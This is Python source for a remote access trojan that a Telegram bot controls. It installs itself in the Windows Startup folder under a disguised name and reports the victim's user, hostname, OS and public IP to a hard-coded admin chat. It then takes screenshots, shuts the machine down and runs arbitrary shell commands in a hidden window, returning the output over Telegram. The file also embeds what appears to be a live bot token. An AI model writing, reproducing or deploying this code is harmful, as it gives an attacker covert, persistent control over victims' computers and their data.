import os
import subprocess
import platform
import telebot
import webbrowser
import requests
import time
import sys
import shutil
from datetime import datetime, timedelta

TOKEN = "8608526329:AAHyaJl9y8DDhjKneh4L8emiptHe7xmKHxc"
ADMIN_ID = "7212576325"

bot = telebot.TeleBot(TOKEN)
start_time = time.time() 

def add_to_startup():
    if platform.system() == "Windows":
        try:
            exe_name = "WindowsHostManager.exe"
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            target_path = os.path.join(startup_folder, exe_name)
            
            current_path = sys.executable
            
            if current_path.lower().endswith(".exe") and not os.path.exists(target_path):
                shutil.copy2(current_path, target_path)
        except:
            pass

def get_detailed_info():
    try:
        sys_os = platform.system()
        node = platform.node()
        release = platform.release()
        machine = platform.machine()
        
        os_info = f"Windows {release}" if sys_os == "Windows" else "Non-Windows System"
        uptime_seconds = int(time.time() - start_time)
        operating_hours = str(timedelta(seconds=uptime_seconds))
        
        try:
            user = os.getlogin() if sys_os == "Windows" else subprocess.getoutput("whoami")
        except:
            user = "Unknown"
            
        current_time = datetime.now().strftime("%H:%M:%S")
        
        try:
            ip = requests.get('https://ifconfig.me/ip', timeout=3).text.strip()
        except:
            ip = "N/A"

        report = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>OS</b>: {os_info} {machine}\n"
            f"<b>Kernel</b>: {sys_os} {release}\n"
            f"<b>User</b>: {user}@{node}\n"
            f"<b>Operating hours</b>: {operating_hours}\n"
            f"<b>Current time</b>: {current_time}\n"
            f"<b>IP</b>: {ip}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "<i>Windows Agent Active...</i>"
        )
        return report
    except Exception as e:
        return f"🚀 Target Online! (Error: {e})"

@bot.message_handler(func=lambda message: str(message.chat.id) == ADMIN_ID)
def handle_commands(message):
    original_cmd = message.text
    cmd = original_cmd.lower()
    chat_id = message.chat.id

    if cmd == "screenshot":
        try:
            import pyautogui
            pyautogui.screenshot("s.png")
            with open("s.png", "rb") as f:
                bot.send_photo(chat_id, f)
            os.remove("s.png")
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi screenshot: {e}")

    elif cmd == "shutdown":
        bot.reply_to(message, "🔌 Shutting down Windows...")
        os.system("shutdown /s /t 1")

    elif cmd.startswith("cd "):
        path = original_cmd[3:].strip()
        try:
            if path == "~": path = os.path.expanduser("~")
            os.chdir(path)
            bot.reply_to(message, f"📂 CWD: <code>{os.getcwd()}</code>", parse_mode="HTML")
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi cd: {e}")

    elif cmd.startswith("open "):
        url = original_cmd[5:].strip()
        try:
            webbrowser.open(url)
            bot.reply_to(message, f"✅ Opened: {url}")
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi mở URL: {e}")

    else:
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            process = subprocess.Popen(original_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=si)
            
            try:
                stdout, stderr = process.communicate(timeout=60)
                result = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
                
                if result.strip():
                    if len(result) > 4000:
                        for i in range(0, len(result), 4000):
                            bot.send_message(chat_id, f"<code>{result[i:i+4000]}</code>", parse_mode="HTML")
                    else:
                        bot.send_message(chat_id, f"<code>{result}</code>", parse_mode="HTML")
                else:
                    bot.reply_to(message, "✔️ Done.")
            except subprocess.TimeoutExpired:
                process.kill()
                bot.reply_to(message, "⏳ Timeout!")
        except Exception as e:
            bot.reply_to(message, f"❌ Shell Error: {e}")

if __name__ == "__main__":
    add_to_startup()
    
    try:
        bot.send_message(ADMIN_ID, get_detailed_info(), parse_mode="HTML")
    except:
        bot.send_message(ADMIN_ID, f"🚀 Target Online!\n{get_detailed_info()}")
    
    bot.infinity_polling(timeout=20, long_polling_timeout=10)

